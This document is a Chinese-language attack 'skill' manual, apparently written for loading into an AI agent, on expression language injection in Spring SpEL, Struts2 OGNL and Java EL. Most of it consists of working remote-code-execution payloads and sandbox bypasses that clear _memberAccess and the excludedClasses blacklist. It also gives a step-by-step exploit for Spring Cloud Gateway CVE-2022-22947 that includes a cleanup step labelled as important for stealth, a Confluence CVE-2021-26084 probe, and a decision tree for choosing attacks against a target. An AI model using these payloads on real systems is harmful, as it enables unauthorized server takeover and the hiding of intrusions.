# 技能：表达式语言注入——专家攻击手册

> **AI 加载指令**：涵盖 SpEL（Spring）、OGNL（Struts2）和 Java EL（JSP/JSF）的专家级 EL 注入技术。与 SSTI 不同——EL 注入针对 Java 框架中的表达式求值器，而非模板引擎。涵盖沙箱绕过、`_memberAccess` 操作、actuator 滥用以及真实世界的 CVE 链。

## 0. 相关路由

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) 用于模板引擎（Jinja2、FreeMarker、Twig）——不同的攻击面
- [jndi-injection](../jndi-injection/SKILL.md) 当 EL 求值导致 JNDI 查询时

**关键区别**：SSTI 针对模板渲染引擎；EL 注入针对嵌入在 Java 框架中的表达式求值器。它们共享检测探针（`${7*7}`），但在利用方式上有所不同。

---

## 1. 检测——多语言探针

```text
${7*7}              → 49 = SpEL、OGNL 或 Java EL
#{7*7}              → 49 = SpEL（替代语法）或 JSF EL
%{7*7}              → 49 = OGNL（Struts2）
${T(java.lang.Math).random()}  → 随机浮点数 = SpEL 确认
%{#context}         → 对象转储 = OGNL 确认
```

### 消歧义

| 对 `${7*7}` 的响应 | 对 `%{7*7}` 的响应 | 引擎 |
|---|---|---|
| 49 | 字面值 `%{7*7}` | SpEL 或 Java EL |
| 字面值 `${7*7}` | 49 | OGNL（Struts2） |
| 49 | 49 | 两者可能都活跃 |

---

## 2. SpEL（SPRING 表达式语言）

### SpEL 出现的位置

- `@Value("${...}")` 注解
- Spring Security 表达式（`@PreAuthorize`）
- Spring Cloud Gateway 路由谓词和过滤器
- Thymeleaf `th:text="${...}"`（当与 `__${...}__` 预处理结合时）
- Spring Data `@Query` 带有 SpEL

### 通过 Runtime.exec 实现远程代码执行

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### 通过输出捕获实现远程代码执行（Commons IO）

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### 通过输出捕获实现远程代码执行（Spring StreamUtils）

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder（当 Runtime 被阻塞时的替代方案）

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

通过 actuator 添加恶意路由并使用 SpEL 过滤器进行利用：

```bash
# 第一步：在过滤器中添加 SpEL（带输出捕获）
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# 第二步：刷新路由以应用
POST /actuator/gateway/refresh

# 第三步：触发路由
GET /hackpath
# 响应头 "Result" 包含命令输出

# 第四步：清理（对隐蔽性很重要）
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL 沙箱绕过

当使用 `SimpleEvaluationContext`（限制 `T()` 操作符）时：

```java
// 尝试基于反射的绕过：
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL（对象图导航语言）

### OGNL 出现的位置

- Apache Struts2 — 主要的 OGNL 消费者
- Confluence Server — 在某些请求路径中使用 OGNL
- 任何使用 `ognl.Ognl.getValue()` 或 `ognl.Ognl.setValue()` 的 Java 应用

### 基本远程代码执行

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 沙箱绕过 — _memberAccess 操作

Struts2 通过 `SecurityMemberAccess` 限制 OGNL。经典绕过方式清除限制：

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil 黑名单清除

较新的 Struts2 版本使用类/包黑名单。通过清除 `excludedClasses` 和 `excludedPackageNames` 进行绕过：

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### 关键 Struts2 CVE

| CVE | 向量 | 有效载荷位置 |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type 头 | `%{...}` 在 Content-Type 中 |
| S2-046 (CVE-2017-5638) | 多部分文件名 | 上传文件名中的 OGNL |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` 前缀 | URL 参数 |
| S2-048 (CVE-2017-9791) | Struts Showcase | 带有 OGNL 的 ActionMessage |
| S2-057 (CVE-2018-11776) | 命名空间 OGNL | URL 路径 |

### Confluence OGNL — CVE-2021-26084

Confluence Server 允许通过 `queryString` 或 action 参数进行 OGNL 注入：

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL 解码：\u0027+{3*3}+\u0027
# 如果响应包含 9 → 确认
# 提升到 Runtime.exec 以实现远程代码执行
```

---

## 4. JAVA EL（JSP / JSF）

### Java EL 出现的位置

- JSP 页面：`${expression}` 和 `#{expression}`
- JSF（JavaServer Faces）：值和方法绑定
- 自定义标签库

### 远程代码执行有效载荷

```java
// Java EL 与 Runtime：
${Runtime.getRuntime().exec("id")}

// 通过 pageContext（JSP）：
${pageContext.request.getServletContext().getClassLoader()}

// 基于反射：
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. 检测方法

```
输入反射且 ${7*7} 返回 49？
├── Java 应用？
│   ├── Struts2？ → 尝试 %{...} OGNL 有效载荷
│   │   └── 检查 Content-Type 注入（S2-045）
│   ├── Spring？ → 尝试 T(java.lang.Runtime) SpEL
│   │   └── 检查 /actuator/gateway（Spring Cloud Gateway）
│   ├── Confluence？ → 尝试通过 action 参数进行 OGNL
│   └── JSP/JSF？ → 尝试 Java EL 有效载荷
│
├── 错误消息揭示框架？
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── 被沙箱阻止？
    ├── OGNL：清除 _memberAccess / excludedClasses
    ├── SpEL：基于反射绕过 SimpleEvaluationContext
    └── 尝试替代执行方法（ProcessBuilder、ScriptEngine）
```

---

## 6. 快速参考

```text
# SpEL 远程代码执行：
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL 远程代码执行（Struts2）：
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# 带沙箱绕过的 OGNL：
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL 远程代码执行：
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 探针：
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947：
POST /actuator/gateway/routes/x  → SpEL 在过滤器参数中
POST /actuator/gateway/refresh
```
